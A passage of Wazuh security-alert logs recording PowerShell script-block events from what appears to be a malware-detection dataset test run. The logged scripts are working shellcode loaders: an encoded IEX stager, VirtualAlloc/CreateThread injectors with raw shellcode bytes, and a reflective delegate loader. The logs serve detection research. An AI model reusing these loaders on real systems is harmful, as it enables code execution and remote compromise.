RWXRztYR+C1y40Cv1rke2fDoCktoc4eAKMIFZc5c+YBpvkfF2wOMaXhkcGYBpzb6AX9OoNWQwfz2uceSwwQ1G/dmmpevV6bCOOhU6aQcoXRIHxgij+L6xbehVx+Pe5N1g6uvODTvVG+Z15Pq6rj90GhfurPr44fL0Q39CnTVHY1133qQKAYkU7rEpDuL9q+vewiJeYgY6gFs8z88WF63sPh5ymlqo6kGJXhEREgZlDQpfLm3EGHfT+vB0f0OB2peNBWTqGJontWdbmvIdqD2Vjnzo/HwGDkOuZBou90kYyGWp8nhSqcDtX3msV+DMLz+nyaONmq9WSgvIjquDHdhuBy3NoMKmdml92E7Y/0FllsFLeHkvovJp7DezL6K3UtqT8NPwjwP/ieg/ZGGCqQS8DVcRI/ty+RsyMgkdfHLkEQOF+NmTfvpdJvJ4AF8j/wA1xafydAoAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\r\n\r\nScriptBlock ID: 717db0b9-2e64-4ca0-b77b-d230bdb5630a\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR2a759aCkFJL2dNXTjo4AUIi6yVVrqHxU1DmKogZfYxouzs/NRAgSyn2/3CYSxTFZ3zJKYlVT/lYmSyLI8eXtHXGl8lUpfC63Gb/FLINtTOwuiXKMQi+d63MXp+6V7YhRqRY/fSpq8+Pqotz8kmAWq0V7E0uyLnuMFTXlm5ZueL2JiFq0qCt4zH1ZntDwpFYehzH2yQBWuycWkUvuxUUNzgE/QWQiQiU7UbrEHqAWoTkU3EWeJ0gM+HI3vOcrohbChLGS8pc6z/a/SkJJ1wTmJRE8som4py6Jyx0ceoxcEX+hDshDfuyXGqmHRoAaSqGVICjPOmpxL2Fkb1vUfnb1MJQaPN/DCSx8e/3q9Ss/l4IbBRcDezubHSoBWkfzXZuAt+qQx3QH/qhUSooFu2LJxQa6hWuREG2hzNM4zBcLpbBcWvgyKv16hWoOB/B60jOsz5N3toCJucOptwDDLFKFyD11xJnpjnqp8n4jvAbxaUgamxCvqZtrS30uCMRnZHfucg4bgIdqMZsgXoMwEmCZklpS5j+bNddUfrc1Eso8IpALgYzBK4ix9qMz+zipxW5okTVQtu8XIRw+KJrk6EzFm3z3tA+goslwHJeUYQIp5ZYUm2BGvJKCwphmUyiRfNcsPrlrJUxSF8cyX26h/YvObFuTh7EUiQvBBAqu7Yi4FLOUkZLSoR4xNjYN8u2Lz/JhYsZoGMBK9xAPGEl5sGUqEQGeZnLQyjaR3XXEyBpQuyRvMRxASmdpsVMVDohX/IWrufb3Qk+5yUk5cBQCbjMuS4pDhYQrI+X5SWJ/6s3hpXHglylIFik1T6q5sZFpFhRkZ3AWr4xUtRllO4KEBHJagq8NHJP3dVsKoE59o19SE8Ez7YbMco0VraIHWu1a8B/Tky5vnHoXvbuOLhqPSx91467VGTZGnU79vmc7dWk3u/Ji2JVW8+buzkadq/FUzrqoc00rq2l9G/Xo1u4jb/qov98a24eK8bi9Czx/2vD94NS3r6rvWrQ/MUdGpYb7jWbSnxgPRqUeN+lDZ0THo1WvJW+nDsNjXw9uqmeYPvbFnVPl1raLUHt54m57vtNeWt5m2tHPJvUVaiJkhk2nZfCLqSHQUHdw4PCHi8DA68BEhmtRMhuNW8Zo1DLQuH33pXGmB2B7g5fGxKnRWXRztYR+C1y40Cv1rke2fDoCktoc4eAKMIFZc5c+YBpvkfF2wOMaXhkcGYBpzb6AX9OoNWQwfz2uceSwwQ1G/dmmpevV6bCOOhU6aQcoXRIHxgij+L6xbehVx+Pe5N1g6uvODTvVG+Z15Pq6rj90GhfurPr44fL0Q39CnTVHY1133qQKAYkU7rEpDuL9q+vewiJeYgY6gFs8z88WF63sPh5ymlqo6kGJXhEREgZlDQpfLm3EGHfT+vB0f0OB2peNBWTqGJontWdbmvIdqD2Vjnzo/HwGDkOuZBou90kYyGWp8nhSqcDtX3msV+DMLz+nyaONmq9WSgvIjquDHdhuBy3NoMKmdml92E7Y/0FllsFLeHkvovJp7DezL6K3UtqT8NPwjwP/ieg/ZGGCqQS8DVcRI/ty+RsyMgkdfHLkEQOF+NmTfvpdJvJ4AF8j/wA1xafydAoAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();","scriptBlockId":"717db0b9-2e64-4ca0-b77b-d230bdb5630a"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:57.422+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":72,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304337.2322299","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:17.3630530Z","eventRecordID":"144992","processID":"8792","threadID":"1120","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x09,0x2f,0x12,0x54,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0xf5,0xcd,0xe7,0xa8,0xed,0x90,0x08,0x51,0xed,0xf4,0x81,0xb4,0xdc,0x34,0xf5,0xbd,0x4e,0x85,0x7d,0x93,0x62,0x6e,0xd3,0x00,0xf1,0x02,0xfc,0x27,0xb2,0xa9,0xda,0x06,0x43,0x81,0x1f,0x08,0xc7,0xd8,0x73,0xea,0xf6,0x12,0x86,0xeb,0x3f,0x4e,0x6b,0xb9,0xe8,0x04,0xde,0x2e,0x9d,0x51,0xe3,0xc5,0xed,0x74,0x63,0x39,0xa5,0x77,0x42,0xec,0xbe,0x21,0x44,0x0e,0x13,0x5a,0xcd,0x08,0x70,0x67,0x87,0xa3,0x42,0x13,0x16,0x62,0x9b,0xdc,0xb5,0x4b,0x14,0x2f,0xc7,0x8c,0x92,0xd0,0xb2,0xe4,0xe1,0x6d,0xc5,0x32,0x98,0xa9,0x40,0xa1,0x3a,0x39,0xf2,0x0d,0xbb,0xee,0x65,0xc5,0xb7,0x5b,0xe1,0x81,0xdb,0x5a,0x26,0xba,0xe7,0xd7,0xc9,0x6d,0x6e,0xa3,0xed,0xa9,0x2b,0x77,0x8f,0xe8,0x91,0xd6,0xb0,0xeb,0x7a,0x86,0x14,0x67,0x96,0xd3,0x24,0x2a,0xfe,0x10,0x05,0xd5,0xfe,0x3e,0x1e,0xa6,0xcc,0xe1,0xb4,0x20,0x7c,0x69,0x13,0xb6,0x83,0x40,0xe3,0x28,0x7a,0x6b,0x14,0x60,0xb8,0x3f,0x44,0x1a,0x69,0x40,0x0f,0xda,0x96,0x95,0x80,0x8a,0x38,0x46,0x61,0x7b,0xf8,0x36,0x09,0x91,0xf7,0x69,0x29,0x9a,0xd2,0x01,0xc0,0x60,0xb4,0xed,0xbd,0x6b,0x28,0x86,0xbf,0x6b,0xa1,0x0a,0x49,0x8d,0xab,0xa2,0x1f,0x05,0x43,0x5a,0x3a,0xdd,0xf2,0xa3,0x90,0x9b,0x34,0x2f,0x17,0x5b,0xfa,0xd8,0x52,0x4f,0x6a,0x29,0x29,0x2d,0x3c,0x36,0x87,0x58,0xc0,0xa2,0x2c,0xcb,0x97,0x5a,0x2f,0x2a,0xdf,0xc4,0xd0,0x19,0x54,0xcc,0x44,0xe2,0x02,0x31,0x89,0xe2,0xd2,0x67,0xc3,0xe2,0xba,0xdf,0xb7,0xb0,0xdf,0x1f,0x62,0xa5,0x4c,0x8a,0x8d,0x9c,0x21,0x1d,0xe6,0x22,0x1c,0x69,0xa9,0xdd,0x4b,0x6b,0x95,0x0b,0xb5,0x19,0xf7,0x8f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 50ef5007-ad81-47c1-b7f5-98f4c5674f2c\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\174.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x09,0x2f,0x12,0x54,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0xf5,0xcd,0xe7,0xa8,0xed,0x90,0x08,0x51,0xed,0xf4,0x81,0xb4,0xdc,0x34,0xf5,0xbd,0x4e,0x85,0x7d,0x93,0x62,0x6e,0xd3,0x00,0xf1,0x02,0xfc,0x27,0xb2,0xa9,0xda,0x06,0x43,0x81,0x1f,0x08,0xc7,0xd8,0x73,0xea,0xf6,0x12,0x86,0xeb,0x3f,0x4e,0x6b,0xb9,0xe8,0x04,0xde,0x2e,0x9d,0x51,0xe3,0xc5,0xed,0x74,0x63,0x39,0xa5,0x77,0x42,0xec,0xbe,0x21,0x44,0x0e,0x13,0x5a,0xcd,0x08,0x70,0x67,0x87,0xa3,0x42,0x13,0x16,0x62,0x9b,0xdc,0xb5,0x4b,0x14,0x2f,0xc7,0x8c,0x92,0xd0,0xb2,0xe4,0xe1,0x6d,0xc5,0x32,0x98,0xa9,0x40,0xa1,0x3a,0x39,0xf2,0x0d,0xbb,0xee,0x65,0xc5,0xb7,0x5b,0xe1,0x81,0xdb,0x5a,0x26,0xba,0xe7,0xd7,0xc9,0x6d,0x6e,0xa3,0xed,0xa9,0x2b,0x77,0x8f,0xe8,0x91,0xd6,0xb0,0xeb,0x7a,0x86,0x14,0x67,0x96,0xd3,0x24,0x2a,0xfe,0x10,0x05,0xd5,0xfe,0x3e,0x1e,0xa6,0xcc,0xe1,0xb4,0x20,0x7c,0x69,0x13,0xb6,0x83,0x40,0xe3,0x28,0x7a,0x6b,0x14,0x60,0xb8,0x3f,0x44,0x1a,0x69,0x40,0x0f,0xda,0x96,0x95,0x80,0x8a,0x38,0x46,0x61,0x7b,0xf8,0x36,0x09,0x91,0xf7,0x69,0x29,0x9a,0xd2,0x01,0xc0,0x60,0xb4,0xed,0xbd,0x6b,0x28,0x86,0xbf,0x6b,0xa1,0x0a,0x49,0x8d,0xab,0xa2,0x1f,0x05,0x43,0x5a,0x3a,0xdd,0xf2,0xa3,0x90,0x9b,0x34,0x2f,0x17,0x5b,0xfa,0xd8,0x52,0x4f,0x6a,0x29,0x29,0x2d,0x3c,0x36,0x87,0x58,0xc0,0xa2,0x2c,0xcb,0x97,0x5a,0x2f,0x2a,0xdf,0xc4,0xd0,0x19,0x54,0xcc,0x44,0xe2,0x02,0x31,0x89,0xe2,0xd2,0x67,0xc3,0xe2,0xba,0xdf,0xb7,0xb0,0xdf,0x1f,0x62,0xa5,0x4c,0x8a,0x8d,0x9c,0x21,0x1d,0xe6,0x22,0x1c,0x69,0xa9,0xdd,0x4b,0x6b,0x95,0x0b,0xb5,0x19,0xf7,0x8f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"50ef5007-ad81-47c1-b7f5-98f4c5674f2c","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\174.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:57.476+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":5,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304337.2333604","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:17.7561410Z","eventRecordID":"144993","processID":"4212","threadID":"5900","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nfunction sdsfkKgtbg {\r\n\tParam ($ebaApCG2f4g, $uGYkJ)\t\t\r\n\t$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\r\n\t\r\n\treturn $pIuRFP.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pIuRFP.GetMethod('GetModuleHandle')).Invoke($null, @($ebaApCG2f4g)))), $uGYkJ))\r\n}\r\n\r\nfunction cpgKNSzZZ {\r\n\tParam (\r\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $hhMaOp,\r\n\t\t[Parameter(Position = 1)] [Type] $mWJBM_W5Sr = [Void]\r\n\t)\r\n\t\r\n\t$pc7Vr9CcQJP = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\r\n\t$pc7Vr9CcQJP.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $hhMaOp).SetImplementationFlags('Runtime, Managed')\r\n\t$pc7Vr9CcQJP.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mWJBM_W5Sr, $hhMaOp).SetImplementationFlags('Runtime, Managed')\r\n\t\r\n\treturn $pc7Vr9CcQJP.CreateType()\r\n}\r\n\r\n[Byte[]]$tHN9skB = [System.Convert]::FromBase64String(\"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKgBamgCABcMieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V\")\r\n\t\t\r\n$vaCr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sdsfkKgtbg kernel32.dll VirtualAlloc), (cpgKNSzZZ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tHN9skB.Length,0x3000, 0x40)\r\n[System.Runtime.InteropServices.Marshal]::Copy($tHN9skB, 0, $vaCr, $tHN9skB.length)\r\n\r\n$y2OM8zWl = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sdsfkKgtbg kernel32.dll CreateThread), (cpgKNSzZZ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vaCr,[IntPtr]::Zero,0,[IntPtr]::Zero)\r\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sdsfkKgtbg kernel32.dll WaitForSingleObject), (cpgKNSzZZ @([IntPtr], [Int32]))).Invoke($y2OM8zWl,0xffffffff) | Out-Null\r\n\r\nScriptBlock ID: 23642aae-7ec5-4e1f-9337-3bf8200873fe\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"function sdsfkKgtbg {   Param ($ebaApCG2f4g, $uGYkJ)\\t\\t   $pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')      return $pIuRFP.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pIuRFP.GetMethod('GetModuleHandle')).Invoke($null, @($ebaApCG2f4g)))), $uGYkJ))  }    function cpgKNSzZZ {   Param (    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $hhMaOp,    [Parameter(Position = 1)] [Type] $mWJBM_W5Sr = [Void]   )      $pc7Vr9CcQJP = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])   $pc7Vr9CcQJP.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $hhMaOp).SetImplementationFlags('Runtime, Managed')   $pc7Vr9CcQJP.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mWJBM_W5Sr, $hhMaOp).SetImplementationFlags('Runtime, Managed')      return $pc7Vr9CcQJP.CreateType()  }    [Byte[]]$tHN9skB = [System.Convert]::FromBase64String(\\\"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKgBamgCABcMieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V\\\")      $vaCr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sdsfkKgtbg kernel32.dll VirtualAlloc), (cpgKNSzZZ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tHN9skB.Length,0x3000, 0x40)  [System.Runtime.InteropServices.Marshal]::Copy($tHN9skB, 0, $vaCr, $tHN9skB.length)    $y2OM8zWl = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sdsfkKgtbg kernel32.dll CreateThread), (cpgKNSzZZ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vaCr,[IntPtr]::Zero,0,[IntPtr]::Zero)  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sdsfkKgtbg kernel32.dll WaitForSingleObject), (cpgKNSzZZ @([IntPtr], [Int32]))).Invoke($y2OM8zWl,0xffffffff) | Out-Null","scriptBlockId":"23642aae-7ec5-4e1f-9337-3bf8200873fe"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:00.848+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":73,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304340.2346079","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:20.8099028Z","eventRecordID":"145014","processID":"3208","threadID":"9064","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$R9Un = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $R9Un -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x22,0xd0,0x4b,0x2f,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x03,0x6a,0x13,0x83,0xc2,0x26,0x32,0xbe,0xd3,0xce,0x30,0x41,0x2c,0x0e,0x55,0xcb,0xc9,0x3f,0x55,0xaf,0x9a,0x6f,0x65,0xbb,0xcf,0x83,0x0e,0xe9,0xfb,0x10,0x62,0x26,0x0b,0x91,0xc9,0x10,0x22,0x22,0x61,0x60,0x25,0xa0,0x78,0xb5,0x85,0x99,0xb2,0xc8,0xc4,0xde,0xaf,0x21,0x94,0xb7,0xa4,0x94,0x09,0xbc,0xf1,0x24,0xa1,0x8e,0x14,0x2d,0x56,0x46,0x16,0x1c,0xc9,0xdd,0x41,0xbe,0xeb,0x32,0xfa,0xf7,0xf3,0x57,0xc7,0x4e,0x8f,0xa3,0xb3,0x50,0x59,0xfa,0x3c,0xfe,0xa4,0x33,0xcf,0xfe,0xe1,0xf3,0x30,0x75,0x18,0x00,0xcc,0x8e,0xdf,0x7b,0x0a,0x1a,0xc4,0xdb,0xd9,0xbc,0x20,0xda,0x0e,0x5a,0xa2,0xd0,0xfb,0x28,0xec,0xf4,0xfa,0xfd,0x86,0x00,0x76,0x00,0x49,0x81,0xcc,0x27,0x4d,0xca,0x97,0x46,0xd4,0xb6,0x76,0x76,0x06,0x19,0x26,0xd2,0x4c,0xb7,0x33,0x6f,0x0f,0xdf,0xf0,0x42,0xb0,0x1f,0x9f,0xd5,0xc3,0x2d,0x00,0x4e,0x4c,0x1d,0xc9,0x48,0x8b,0x62,0xe0,0x2d,0x03,0x9d,0x0b,0x4e,0x0d,0x59,0x5f,0x1e,0x25,0x48,0xe0,0xf5,0xb5,0x75,0x35,0x63,0xb3,0xe1,0x76,0xdc,0xac,0x72,0x1e,0x1f,0xd3,0x75,0x64,0x96,0x35,0x25,0xca,0xf9,0xe9,0x85,0xba,0xb9,0x59,0x6d,0xd1,0x35,0x85,0x8d,0xda,0x9f,0xae,0x27,0x35,0x76,0x86,0xdf,0xac,0xd3,0x5c,0x7e,0x30,0xce,0x18,0x40,0xba,0xfd,0xdd,0x0e,0x4b,0x8b,0xcd,0xe6,0xbb,0xc6,0xac,0xa0,0xc4,0xfc,0xdb,0x4c,0x51,0xfb,0x4d,0x1b,0xcd,0x01,0xab,0x6b,0x52,0xf9,0x9e,0xe0,0x5b,0x6f,0x61,0x9e,0xa3,0x7f,0x61,0x5e,0xf2,0x15,0x61,0x36,0xa2,0x4d,0x32,0x23,0xad,0x5b,0x26,0xf8,0x38,0x64,0x1f,0xad,0xeb,0x0c,0x9d,0x88,0xdc,0x92,0x5e,0xff,0xdc,0xef,0x88,0x39,0xab,0x01,0x09;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PR3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PR3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PR3,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 7b4561e2-a2da-4cd5-a5a6-13f10ae8c413\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1784.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$R9Un = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $R9Un -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x22,0xd0,0x4b,0x2f,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x03,0x6a,0x13,0x83,0xc2,0x26,0x32,0xbe,0xd3,0xce,0x30,0x41,0x2c,0x0e,0x55,0xcb,0xc9,0x3f,0x55,0xaf,0x9a,0x6f,0x65,0xbb,0xcf,0x83,0x0e,0xe9,0xfb,0x10,0x62,0x26,0x0b,0x91,0xc9,0x10,0x22,0x22,0x61,0x60,0x25,0xa0,0x78,0xb5,0x85,0x99,0xb2,0xc8,0xc4,0xde,0xaf,0x21,0x94,0xb7,0xa4,0x94,0x09,0xbc,0xf1,0x24,0xa1,0x8e,0x14,0x2d,0x56,0x46,0x16,0x1c,0xc9,0xdd,0x41,0xbe,0xeb,0x32,0xfa,0xf7,0xf3,0x57,0xc7,0x4e,0x8f,0xa3,0xb3,0x50,0x59,0xfa,0x3c,0xfe,0xa4,0x33,0xcf,0xfe,0xe1,0xf3,0x30,0x75,0x18,0x00,0xcc,0x8e,0xdf,0x7b,0x0a,0x1a,0xc4,0xdb,0xd9,0xbc,0x20,0xda,0x0e,0x5a,0xa2,0xd0,0xfb,0x28,0xec,0xf4,0xfa,0xfd,0x86,0x00,0x76,0x00,0x49,0x81,0xcc,0x27,0x4d,0xca,0x97,0x46,0xd4,0xb6,0x76,0x76,0x06,0x19,0x26,0xd2,0x4c,0xb7,0x33,0x6f,0x0f,0xdf,0xf0,0x42,0xb0,0x1f,0x9f,0xd5,0xc3,0x2d,0x00,0x4e,0x4c,0x1d,0xc9,0x48,0x8b,0x62,0xe0,0x2d,0x03,0x9d,0x0b,0x4e,0x0d,0x59,0x5f,0x1e,0x25,0x48,0xe0,0xf5,0xb5,0x75,0x35,0x63,0xb3,0xe1,0x76,0xdc,0xac,0x72,0x1e,0x1f,0xd3,0x75,0x64,0x96,0x35,0x25,0xca,0xf9,0xe9,0x85,0xba,0xb9,0x59,0x6d,0xd1,0x35,0x85,0x8d,0xda,0x9f,0xae,0x27,0x35,0x76,0x86,0xdf,0xac,0xd3,0x5c,0x7e,0x30,0xce,0x18,0x40,0xba,0xfd,0xdd,0x0e,0x4b,0x8b,0xcd,0xe6,0xbb,0xc6,0xac,0xa0,0xc4,0xfc,0xdb,0x4c,0x51,0xfb,0x4d,0x1b,0xcd,0x01,0xab,0x6b,0x52,0xf9,0x9e,0xe0,0